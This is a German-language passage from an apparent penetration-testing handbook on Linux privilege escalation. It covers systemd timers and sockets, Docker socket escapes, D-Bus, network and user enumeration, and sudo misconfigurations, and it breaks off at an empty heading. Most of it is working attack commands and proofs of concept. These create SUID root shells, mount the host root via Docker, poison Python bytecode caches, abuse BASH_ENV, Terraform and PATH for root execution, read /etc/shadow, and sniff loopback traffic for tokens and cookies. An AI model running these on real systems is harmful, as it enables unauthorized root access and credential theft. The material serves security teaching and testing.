## **Timers**

**Timers** sind systemd unit files, deren Name auf `**.timer**` endet und die `**.service**`-Dateien oder events steuern. **Timers** können als Alternative zu cron verwendet werden, da sie eingebaute Unterstützung für calendar time events und monotonic time events haben und asynchron ausgeführt werden können.

Sie können alle timers mit folgendem Befehl auflisten:
```bash
systemctl list-timers --all
```
### Schreibbare Timer

Wenn du einen Timer ändern kannst, kannst du ihn dazu bringen, einige vorhandene systemd.unit auszuführen (wie eine `.service` oder eine `.target`)
```bash
Unit=backdoor.service
```
In der Dokumentation kannst du lesen, was die Unit ist:

> Die Unit, die aktiviert wird, wenn dieser Timer abläuft. Das Argument ist ein Unit-Name, dessen Suffix nicht ".timer" ist. Falls nicht angegeben, setzt dieser Wert standardmäßig auf einen Service, der denselben Namen wie die Timer-Unit hat, außer dem Suffix. (Siehe oben.) Es wird empfohlen, dass der Name der aktivierten Unit und der Name der Timer-Unit identisch sind, außer dem Suffix.

Daher müsstest du, um diese Berechtigung auszunutzen:

- Eine systemd Unit (wie eine `.service`) finden, die ein schreibbares Binary **ausführt**
- Eine systemd Unit finden, die einen relativen Pfad **ausführt**, und du hast **schreibende Berechtigungen** über den **systemd PATH** (um dieses ausführbare Programm zu impersonieren)

**Mehr über timers erfährst du mit `man systemd.timer`.**

### **Timer aktivieren**

Um einen Timer zu aktivieren, brauchst du root-Rechte und musst ausführen:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Beachte, dass der **timer** durch das Erstellen eines Symlinks darauf unter `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer` **aktiviert** wird

## Sockets

Unix Domain Sockets (UDS) ermöglichen **Prozesskommunikation** auf demselben oder auf unterschiedlichen Maschinen innerhalb von Client-Server-Modellen. Sie verwenden standardmäßige Unix-Descriptor-Dateien für die Kommunikation zwischen Computern und werden über `.socket`-Dateien eingerichtet.

Sockets können mit `.socket`-Dateien konfiguriert werden.

**Erfahre mehr über sockets mit `man systemd.socket`.** In dieser Datei können mehrere interessante Parameter konfiguriert werden:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Diese Optionen sind unterschiedlich, aber als Zusammenfassung wird verwendet, um anzugeben, wo auf dem socket gelauscht wird (der Pfad der AF_UNIX socket-Datei, die IPv4/6 und/oder Portnummer zum Lauschen usw.)
- `Accept`: Nimmt ein boolesches Argument. Wenn **true**, wird für jede eingehende Verbindung eine **Service-Instanz gestartet** und nur der Verbindungs-socket an sie übergeben. Wenn **false**, werden alle lauschenden sockets selbst an die gestartete Service-Unit **übergeben**, und es wird nur eine Service-Unit für alle Verbindungen gestartet. Dieser Wert wird für Datagram-Sockets und FIFOs ignoriert, bei denen eine einzelne Service-Unit ausnahmslos allen eingehenden Traffic behandelt. **Standard ist false**. Aus Performance-Gründen wird empfohlen, neue Daemons nur so zu schreiben, dass sie für `Accept=no` geeignet sind.
- `ExecStartPre`, `ExecStartPost`: Nimmt eine oder mehrere Befehlszeilen, die **vor** bzw. **nach** der Erstellung und Bindung der lauschenden **sockets**/FIFOs ausgeführt werden. Das erste Token der Befehlszeile muss eine absolute Datei sein, gefolgt von Argumenten für den Prozess.
- `ExecStopPre`, `ExecStopPost`: Zusätzliche **Befehle**, die **vor** bzw. **nach** dem Schließen und Entfernen der lauschenden **sockets**/FIFOs ausgeführt werden.
- `Service`: Gibt den Namen der **Service**-Unit an, die bei **eingehendem Traffic** **aktiviert** werden soll. Diese Einstellung ist nur für sockets mit Accept=no erlaubt. Standard ist der Service, der denselben Namen wie der socket trägt (mit ersetzter Endung). In den meisten Fällen sollte es nicht notwendig sein, diese Option zu verwenden.

### Writable .socket files

Wenn du eine **schreibbare** `.socket`-Datei findest, kannst du am Anfang des `[Socket]`-Abschnitts etwas wie `ExecStartPre=/home/kali/sys/backdoor` hinzufügen, und die backdoor wird ausgeführt, bevor der socket erstellt wird. Daher musst du **wahrscheinlich warten, bis die Maschine neu gestartet wird.**\
_Beachte, dass das System diese socket-Datei-Konfiguration verwenden muss, sonst wird die backdoor nicht ausgeführt_

### Socket activation + writable unit path (create missing service)

Eine weitere Fehlkonfiguration mit hohem Impact ist:

- eine socket-Unit mit `Accept=no` und `Service=<name>.service`
- die referenzierte service-Unit fehlt
- ein Angreifer kann nach `/etc/systemd/system` (oder einen anderen Unit-Suchpfad) schreiben

In diesem Fall kann der Angreifer `<name>.service` erstellen und dann Traffic an den socket auslösen, sodass systemd den neuen Service als root lädt und ausführt.

Quick flow:
```bash
systemctl cat vuln.socket
# [Socket]
# Accept=no
# Service=vuln.service
```

```bash
cat >/etc/systemd/system/vuln.service <<'EOF'
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'cp /bin/bash /var/tmp/rootbash && chmod 4755 /var/tmp/rootbash'
EOF
nc -q0 127.0.0.1 9999
/var/tmp/rootbash -p
```
### Schreibbare Sockets

Wenn du **irgendeinen schreibbaren Socket identifizierst** (_hier geht es um Unix Sockets und nicht um die Config-`.socket`-Dateien_), dann **kannst du** mit diesem Socket kommunizieren und möglicherweise eine Schwachstelle ausnutzen.

### Unix Sockets aufzählen
```bash
netstat -a -p --unix
```
### Rohverbindung
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Ausnutzungsbeispiel:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP-Sockets

Beachte, dass es einige **Sockets geben kann, die auf HTTP**-Anfragen lauschen (_ich spreche nicht von .socket-Dateien, sondern von Dateien, die als Unix-Sockets fungieren_). Das kannst du so prüfen:
```bash
curl --max-time 2 --unix-socket /path/to/socket/file http://localhost/
```
Wenn das Socket mit einer **HTTP**-Anfrage antwortet, kannst du mit ihm **kommunizieren** und vielleicht **eine Schwachstelle ausnutzen**.

### Writable Docker Socket

Das Docker-Socket, oft unter `/var/run/docker.sock` zu finden, ist eine kritische Datei, die abgesichert werden sollte. Standardmäßig ist es für den Benutzer `root` und Mitglieder der `docker`-Gruppe schreibbar. Schreibzugriff auf dieses Socket zu besitzen, kann zu Privilege Escalation führen. Hier ist eine Aufschlüsselung, wie das gemacht werden kann, und alternative Methoden, falls die Docker-CLI nicht verfügbar ist.

#### **Privilege Escalation with Docker CLI**

Wenn du Schreibzugriff auf das Docker-Socket hast, kannst du Privilege Escalation mit den folgenden Befehlen durchführen:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Diese Befehle ermöglichen es dir, einen Container mit Root-Zugriff auf das Dateisystem des Hosts auszuführen.

#### **Using Docker API Directly**

In Fällen, in denen die Docker CLI nicht verfügbar ist, kann der Docker-Socket dennoch mithilfe der Docker API und `curl`-Befehlen manipuliert werden.

1.  **List Docker Images:** Rufe die Liste der verfügbaren Images ab.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** Sende eine Anfrage, um einen Container zu erstellen, der das Root-Verzeichnis des Host-Systems einbindet.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Starte den neu erstellten Container:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** Verwende `socat`, um eine Verbindung zum Container herzustellen und damit die Ausführung von Befehlen darin zu ermöglichen.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

Nach dem Einrichten der `socat`-Verbindung kannst du Befehle direkt im Container mit Root-Zugriff auf das Dateisystem des Hosts ausführen.

### Others

Beachte, dass du, wenn du Schreibrechte auf den docker socket hast, weil du **in der Gruppe `docker`** bist, [**mehrere Möglichkeiten zur Privilegieneskalation**](interesting-groups-linux-pe/index.html#docker-group) hast. Wenn die [**docker API auf einem Port lauscht**](../../network-services-pentesting/2375-pentesting-docker.md#compromising), kannst du sie möglicherweise ebenfalls kompromittieren.

Prüfe **weitere Möglichkeiten, aus Containern auszubrechen oder Container-Runtimes für eine Privilegieneskalation zu missbrauchen** in:


{{#ref}}
container-security/
{{#endref}}

## Containerd (ctr) privilege escalation

Wenn du das **`ctr`**-Kommando verwenden kannst, lies die folgende Seite, da du es möglicherweise missbrauchen kannst, um Privilegien zu eskalieren:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

Wenn du das **`runc`**-Kommando verwenden kannst, lies die folgende Seite, da du es möglicherweise missbrauchen kannst, um Privilegien zu eskalieren:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus ist ein ausgeklügeltes **Inter-Process Communication (IPC)**-System, das Anwendungen ermöglicht, effizient miteinander zu interagieren und Daten auszutauschen. Es wurde für moderne Linux-Systeme entwickelt und bietet ein robustes Framework für verschiedene Formen der Anwendungs-Kommunikation.

Das System ist vielseitig und unterstützt grundlegendes IPC, das den Datenaustausch zwischen Prozessen verbessert, ähnlich wie **erweiterte UNIX domain sockets**. Außerdem unterstützt es das Broadcasting von Events oder Signalen und fördert so die nahtlose Integration zwischen Systemkomponenten. Ein Signal eines Bluetooth-Daemons über einen eingehenden Anruf kann beispielsweise einen Musikplayer zum Stummschalten veranlassen und so die Benutzererfahrung verbessern. Zusätzlich unterstützt D-Bus ein Remote-Object-System, das Service-Anfragen und Method Aufrufe zwischen Anwendungen vereinfacht und Prozesse verschlankt, die traditionell komplex waren.

D-Bus arbeitet nach einem **allow/deny model** und verwaltet Nachrichtenberechtigungen (Methodenaufrufe, Signalausgaben usw.) auf Grundlage der kumulativen Wirkung passender Policy-Regeln. Diese Policies legen Interaktionen mit dem Bus fest und können möglicherweise durch den Missbrauch dieser Berechtigungen zur Privilegieneskalation führen.

Ein Beispiel für eine solche Policy in `/etc/dbus-1/system.d/wpa_supplicant.conf` ist angegeben und beschreibt Berechtigungen für den root-User, `fi.w1.wpa_supplicant1` zu besitzen, Nachrichten an ihn zu senden und von ihm zu empfangen.

Policies ohne angegebenen User oder Gruppe gelten universell, während "default"-Kontext-Policies für alle gelten, die nicht von anderen spezifischen Policies abgedeckt werden.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Lerne hier, wie man eine D-Bus-Kommunikation enumeriert und ausnutzt:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Netzwerk**

Es ist immer interessant, das Netzwerk zu enumerieren und die Position der Maschine herauszufinden.

### Generische Enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#NSS resolution order (hosts file vs DNS)
grep -E '^(hosts|networks):' /etc/nsswitch.conf
getent hosts localhost

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)
(ip -br addr || ip addr show)

#Routes and policy routing (pivot paths)
ip route
ip -6 route
ip rule
ip route get 1.1.1.1

#L2 neighbours
(arp -e || arp -a || ip neigh)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#L2 topology (VLANs/bridges/bonds)
ip -d link
bridge link 2>/dev/null

#Network namespaces (hidden interfaces/routes in containers)
ip netns list 2>/dev/null
ls /var/run/netns/ 2>/dev/null
nsenter --net=/proc/1/ns/net ip a 2>/dev/null

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#nftables and firewall wrappers (modern hosts)
sudo nft list ruleset 2>/dev/null
sudo nft list ruleset -a 2>/dev/null
sudo ufw status verbose 2>/dev/null
sudo firewall-cmd --state 2>/dev/null
sudo firewall-cmd --list-all 2>/dev/null

#Forwarding / asymmetric routing / conntrack state
sysctl net.ipv4.ip_forward net.ipv6.conf.all.forwarding net.ipv4.conf.all.rp_filter 2>/dev/null
sudo conntrack -L 2>/dev/null | head -n 20

#Files used by network services
lsof -i
```
### Schnelle Triage der Outbound-Filterung

Wenn der Host Befehle ausführen kann, aber Callbacks fehlschlagen, trenne DNS-, Transport-, Proxy- und Route-Filterung schnell:
```bash
# DNS over UDP and TCP (TCP fallback often survives UDP/53 filters)
dig +time=2 +tries=1 @1.1.1.1 google.com A
dig +tcp +time=2 +tries=1 @1.1.1.1 google.com A

# Common outbound ports
for p in 22 25 53 80 443 587 8080 8443; do nc -vz -w3 example.org "$p"; done

# Route/path clue for 443 filtering
sudo traceroute -T -p 443 example.org 2>/dev/null || true

# Proxy-enforced environments and remote-DNS SOCKS testing
env | grep -iE '^(http|https|ftp|all)_proxy|no_proxy'
curl --socks5-hostname <ip>:1080 https://ifconfig.me
```
### Offene Ports

Überprüfe immer Netzwerkdienste, die auf der Maschine laufen und mit denen du vor dem Zugriff nicht interagieren konntest:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
ss -tulpn
#Quick view of local bind addresses (great for hidden/isolated interfaces)
ss -tulpn | awk '{print $5}' | sort -u
```
Klassifiziere Listener nach Bind-Ziel:

- `0.0.0.0` / `[::]`: auf allen lokalen Interfaces exponiert.
- `127.0.0.1` / `::1`: nur lokal (gute Kandidaten für Tunnels/Forwards).
- Spezifische interne IPs (z. B. `10.x`, `172.16/12`, `192.168.x`, `fe80::`): meist nur von internen Segmenten aus erreichbar.

### Local-only service triage workflow

Wenn du einen Host kompromittierst, werden an `127.0.0.1` gebundene Services oft zum ersten Mal aus deiner Shell heraus erreichbar. Ein schneller lokaler Workflow ist:
```bash
# 1) Find local listeners
ss -tulnp

# 2) Discover open localhost TCP ports
nmap -Pn --open -p- 127.0.0.1

# 3) Fingerprint only discovered ports
nmap -Pn -sV -p <ports> 127.0.0.1

# 4) Manually interact / banner grab
nc 127.0.0.1 <port>
printf 'HELP\r\n' | nc 127.0.0.1 <port>
```
### LinPEAS als network scanner (network-only mode)

Neben lokalen PE-Checks kann linPEAS als fokussierter network scanner ausgeführt werden. Es verwendet verfügbare Binaries in `$PATH` (typischerweise `fping`, `ping`, `nc`, `ncat`) und installiert keine Tools.
```bash
# Auto-discover subnets + hosts + quick ports
./linpeas.sh -t

# Host discovery in CIDR
./linpeas.sh -d 10.10.10.0/24

# Host discovery + custom ports
./linpeas.sh -d 10.10.10.0/24 -p 22,80,443

# Scan one IP (default/common ports)
./linpeas.sh -i 10.10.10.20

# Scan one IP with selected ports
./linpeas.sh -i 10.10.10.20 -p 21,22,80,443
```
Wenn du `-d`, `-p` oder `-i` ohne `-t` übergibst, verhält sich linPEAS wie ein reiner Netzwerkscanner (der Rest der Privilege-Escalation-Prüfungen wird übersprungen).

### Sniffing

Prüfe, ob du Traffic sniffen kannst. Wenn ja, könntest du einige Credentials abgreifen.
```
timeout 1 tcpdump
```
Schnelle praktische Prüfungen:
```bash
#Can I capture without full sudo?
which dumpcap && getcap "$(which dumpcap)"

#Find capture interfaces
tcpdump -D
ip -br addr
```
Loopback (`lo`) ist besonders wertvoll in der Post-Exploitation, weil dort viele nur intern erreichbare Services Tokens/Cookies/Credentials ausgeben:
```bash
sudo tcpdump -i lo -s 0 -A -n 'tcp port 80 or 8000 or 8080' \
| egrep -i 'authorization:|cookie:|set-cookie:|x-api-key|bearer|token|csrf'
```
Aufnehmen jetzt, später parsen:
```bash
sudo tcpdump -i any -s 0 -n -w /tmp/capture.pcap
tshark -r /tmp/capture.pcap -Y http.request \
-T fields -e frame.time -e ip.src -e http.host -e http.request.uri
```
## Benutzer

### Allgemeine Enumeration

Prüfe, **wer** du bist, welche **Privilegien** du hast, welche **Benutzer** sich im System befinden, welche sich **login** können und welche **root privileges** haben:
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
who
w
#Only usernames
users
#Login history
last | tail
#Last log of each user
lastlog2 2>/dev/null || lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Big UID

Einige Linux-Versionen waren von einem Bug betroffen, der es Benutzern mit **UID > INT_MAX** ermöglicht, Privilegien zu eskalieren. Mehr Infos: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) und [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Exploit it** using: **`systemd-run -t /bin/bash`**

### Groups

Prüfe, ob du Mitglied in einer **Gruppe** bist, die dir Root-Rechte verschaffen könnte:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Clipboard

Prüfe, ob sich im Clipboard etwas Interessantes befindet (falls möglich)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Passwortrichtlinie
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Bekannte Passwörter

Wenn du **irgendein Passwort** der Umgebung **kennst**, versuche, dich mit dem Passwort als jeder Benutzer anzumelden.

### Su Brute

Wenn es dir nichts ausmacht, viel Lärm zu verursachen, und die Binaries `su` und `timeout` auf dem Computer vorhanden sind, kannst du versuchen, Benutzer mit [su-bruteforce](https://github.com/carlospolop/su-bruteforce) per Brute-Force anzugreifen.\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) mit dem Parameter `-a` versucht ebenfalls, Benutzer per Brute-Force anzugreifen.

## Schreibbare PATH-Missbrauchsarten

### $PATH

Wenn du feststellst, dass du **in einen Ordner innerhalb des $PATH schreiben kannst**, kannst du möglicherweise Privilegien eskalieren, indem du **eine Backdoor in dem schreibbaren Ordner** mit dem Namen eines Befehls erstellst, der von einem anderen Benutzer ausgeführt wird (idealerweise root) und **nicht aus einem Ordner geladen wird, der vor** deinem schreibbaren Ordner im $PATH liegt.

### SUDO und SUID

Es könnte dir erlaubt sein, einen bestimmten Befehl mit sudo auszuführen, oder er könnte das suid-Bit haben. Prüfe es mit:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Einige **unerwartete Befehle erlauben es dir, Dateien zu lesen und/oder zu schreiben oder sogar einen Befehl auszuführen.** Zum Beispiel:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Die sudo-Konfiguration kann einem Benutzer erlauben, einen bestimmten Befehl mit den Rechten eines anderen Benutzers auszuführen, ohne das Passwort zu kennen.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
In diesem Beispiel kann der Benutzer `demo` `vim` als `root` ausführen, es ist nun trivial, eine Shell zu erhalten, indem man einen ssh-Schlüssel in das root-Verzeichnis hinzufügt oder `sh` aufruft.
```
sudo vim -c '!sh'
```
### SETENV

Diese Direktive ermöglicht es dem Benutzer, **eine Umgebungsvariable festzulegen**, während etwas ausgeführt wird:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Dieses Beispiel, **basierend auf der HTB-Maschine Admirer**, war **anfällig** für **PYTHONPATH hijacking**, um beim Ausführen des Skripts als root eine beliebige Python-Library zu laden:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### Writable `__pycache__` / `.pyc` poisoning in sudo-allowed Python imports

Wenn ein **sudo-allowed Python script** ein Modul importiert, dessen Paketverzeichnis ein **schreibbares `__pycache__`** enthält, kannst du möglicherweise den gecachten `.pyc` ersetzen und beim nächsten Import Codeausführung als privilegierter Benutzer erreichen.

- Warum es funktioniert:
- CPython speichert Bytecode-Caches in `__pycache__/module.cpython-<ver>.pyc`.
- Der Interpreter validiert den **Header** (Magic + Timestamp-/Hash-Metadaten, die an die Source gebunden sind), und führt dann das serialisierte Code-Objekt aus, das nach diesem Header gespeichert ist.
- Wenn du die gecachte Datei **löschen und neu erstellen** kannst, weil das Verzeichnis schreibbar ist, kann ein root-owned, aber nicht beschreibbarer `.pyc` trotzdem ersetzt werden.
- Typischer Pfad:
- `sudo -l` zeigt ein Python script oder Wrapper, den du als root ausführen kannst.
- Dieses Script importiert ein lokales Modul aus `/opt/app/`, `/usr/local/lib/...`, usw.
- Das `__pycache__`-Verzeichnis des importierten Moduls ist für deinen Benutzer oder für alle schreibbar.

Quick enumeration:
```bash
sudo -l
find / -type d -name __pycache__ -writable 2>/dev/null
find / -type f -path '*/__pycache__/*.pyc' -ls 2>/dev/null
```
Wenn du das privilegierte Skript untersuchen kannst, identifiziere die importierten Module und ihren Cache-Pfad:
```bash
grep -R "^import \\|^from " /opt/target/ 2>/dev/null
python3 - <<'PY'
import importlib.util
spec = importlib.util.find_spec("target_module")
print(spec.origin)
print(spec.cached)
PY
```
Missbrauchs-Workflow:

1. Führe das vom sudo erlaubte Skript einmal aus, damit Python die legitime Cache-Datei erstellt, falls sie noch nicht existiert.
2. Lese die ersten 16 Bytes aus der legitimen `.pyc` und verwende sie in der vergifteten Datei erneut.
3. Kompiliere ein Payload-Code-Object, `marshal.dumps(...)` es, lösche die ursprüngliche Cache-Datei und erstelle sie mit dem originalen Header plus deinem bösartigen Bytecode neu.
4. Führe das vom sudo erlaubte Skript erneut aus, damit der Import dein Payload als root ausführt.

Wichtige Hinweise:

- Die Wiederverwendung des originalen Headers ist entscheidend, weil Python die Cache-Metadaten mit der Source-Datei vergleicht, nicht ob der Bytecode-Body wirklich zur Source passt.
- Das ist besonders nützlich, wenn die Source-Datei root-owned und nicht schreibbar ist, aber das enthaltene `__pycache__`-Verzeichnis schon.
- Der Angriff schlägt fehl, wenn der privilegierte Prozess `PYTHONDONTWRITEBYTECODE=1` verwendet, aus einem Pfad mit sicheren Berechtigungen importiert oder den Schreibzugriff auf jedes Verzeichnis im Import-Pfad entfernt.

Minimale Proof-of-Concept-Form:
```python
import marshal, pathlib, subprocess, tempfile

pyc = pathlib.Path("/opt/app/__pycache__/target.cpython-312.pyc")
header = pyc.read_bytes()[:16]
payload = "import os; os.system('cp /bin/bash /tmp/rbash && chmod 4755 /tmp/rbash')"

with tempfile.TemporaryDirectory() as d:
src = pathlib.Path(d) / "x.py"
src.write_text(payload)
code = compile(src.read_text(), str(src), "exec")
pyc.unlink()
pyc.write_bytes(header + marshal.dumps(code))

subprocess.run(["sudo", "/opt/app/runner.py"])
```
Hardening:

- Stellen Sie sicher, dass kein Verzeichnis im privilegierten Python-Importpfad von Benutzern mit niedrigen Rechten beschreibbar ist, einschließlich `__pycache__`.
- Erwägen Sie für privilegierte Ausführungen `PYTHONDONTWRITEBYTECODE=1` und regelmäßige Prüfungen auf unerwartete beschreibbare `__pycache__`-Verzeichnisse.
- Behandeln Sie beschreibbare lokale Python-Module und beschreibbare Cache-Verzeichnisse genauso wie beschreibbare Shell-Skripte oder gemeinsam genutzte Bibliotheken, die von root ausgeführt werden.

### BASH_ENV beibehalten via sudo env_keep → root shell

Wenn sudoers `BASH_ENV` beibehält (z. B. `Defaults env_keep+="ENV BASH_ENV"`), können Sie das nicht-interaktive Startverhalten von Bash ausnutzen, um bei der Ausführung eines erlaubten Befehls beliebigen Code als root auszuführen.

- Warum es funktioniert: Bei nicht-interaktiven Shells wertet Bash `$BASH_ENV` aus und sourced diese Datei, bevor das Zielskript ausgeführt wird. Viele sudo-Regeln erlauben das Ausführen eines Skripts oder eines Shell-Wrappers. Wenn `BASH_ENV` von sudo beibehalten wird, wird Ihre Datei mit root-Rechten sourced.

- Anforderungen:
- Eine sudo-Regel, die Sie ausführen können (jedes Ziel, das `/bin/bash` nicht-interaktiv aufruft, oder jedes bash-Skript).
- `BASH_ENV` in `env_keep` vorhanden (prüfen mit `sudo -l`).

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Hardening:
- Entferne `BASH_ENV` (und `ENV`) aus `env_keep`, bevorzuge `env_reset`.
- Vermeide Shell-Wrapper für per sudo erlaubte Befehle; verwende minimale Binaries.
- Ziehe sudo I/O-Logging und Alerting in Betracht, wenn beibehaltene Env-Variablen verwendet werden.

### Terraform via sudo with preserved HOME (!env_reset)

Wenn sudo die Umgebung intakt lässt (`!env_reset`), während `terraform apply` erlaubt ist, bleibt `$HOME` der aufrufende Benutzer. Terraform lädt daher **$HOME/.terraformrc** als root und berücksichtigt `provider_installation.dev_overrides`.

- Weise den benötigten Provider auf ein beschreibbares Verzeichnis und platziere ein bösartiges Plugin mit dem Namen des Providers (z. B. `terraform-provider-examples`):
```hcl
# ~/.terraformrc
provider_installation {
dev_overrides {
"previous.htb/terraform/examples" = "/dev/shm"
}
direct {}
}
```

```bash
cat >/dev/shm/terraform-provider-examples <<'EOF'
#!/bin/bash
cp /bin/bash /var/tmp/rootsh
chown root:root /var/tmp/rootsh
chmod 6777 /var/tmp/rootsh
EOF
chmod +x /dev/shm/terraform-provider-examples
sudo /usr/bin/terraform -chdir=/opt/examples apply
```
Terraform wird den Go-Plugin-Handshake fehlschlagen lassen, führt aber die Payload als root aus, bevor es abstürzt, und hinterlässt dabei eine SUID-Shell.

### TF_VAR overrides + symlink validation bypass

Terraform-Variablen können über `TF_VAR_<name>`-Umgebungsvariablen bereitgestellt werden, die erhalten bleiben, wenn sudo die Umgebung beibehält. Schwache Validierungen wie `strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")` können mit Symlinks umgangen werden:
```bash
mkdir -p /dev/shm/root/examples
ln -s /root/root.txt /dev/shm/root/examples/flag
TF_VAR_source_path=/dev/shm/root/examples/flag sudo /usr/bin/terraform -chdir=/opt/examples apply
cat /home/$USER/docker/previous/public/examples/flag
```
Terraform löst den Symlink auf und kopiert die echte `/root/root.txt` in ein für den Angreifer lesbares Ziel. Derselbe Ansatz kann verwendet werden, um in privilegierte Pfade zu **schreiben**, indem Ziel-Symlinks im Voraus erstellt werden (z. B. indem der Zielpfad des Providers innerhalb von `/etc/cron.d/` platziert wird).

### requiretty / !requiretty

Auf einigen älteren Distributionen kann sudo mit `requiretty` konfiguriert sein, was erzwingt, dass sudo nur von einem interaktiven TTY aus ausgeführt wird. Wenn `!requiretty` gesetzt ist (oder die Option fehlt), kann sudo aus nicht-interaktiven Kontexten wie reverse shells, cron jobs oder Skripten ausgeführt werden.
```bash
Defaults !requiretty
```
Dies ist nicht selbst eine direkte Schwachstelle, aber es erweitert die Situationen, in denen sudo-Regeln missbraucht werden können, ohne dass ein vollständiges PTY nötig ist.

### Sudo env_keep+=PATH / insecure secure_path → PATH hijack

Wenn `sudo -l` `env_keep+=PATH` oder einen `secure_path` zeigt, der vom Angreifer beschreibbare Einträge enthält (z. B. `/home/<user>/bin`), kann jeder relative Befehl innerhalb des durch sudo erlaubten Ziels überschrieben werden.

- Anforderungen: eine sudo-Regel (oft `NOPASSWD`), die ein Script/Binary ausführt, das Befehle ohne absolute Pfade aufruft (`free`, `df`, `ps`, etc.), und ein beschreibbarer PATH-Eintrag, der zuerst durchsucht wird.
```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x ~/bin/free
sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
bash -p                                # root shell via SUID bit
```
### Sudo-Ausführungspfad-Bypass
**Springe**, um andere Dateien zu lesen oder **symlinks** zu verwenden. Zum Beispiel in der sudoers-Datei: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Wenn ein **Wildcard** verwendet wird (\*), ist es noch einfacher:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Gegenmaßnahmen**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary without command path

